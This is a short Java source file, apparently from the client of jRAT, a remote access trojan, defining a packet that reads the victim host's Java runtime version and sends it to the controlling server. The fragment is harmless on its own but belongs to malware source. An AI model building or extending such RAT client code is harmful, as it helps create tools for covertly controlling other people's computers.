package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet9InitJavaVersion implements OutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		String version = System.getProperty("java.runtime.version");

        con.writeLine(version);
	}

	@Override
	public short getPacketId() {
		return (byte) 9;
	}

}
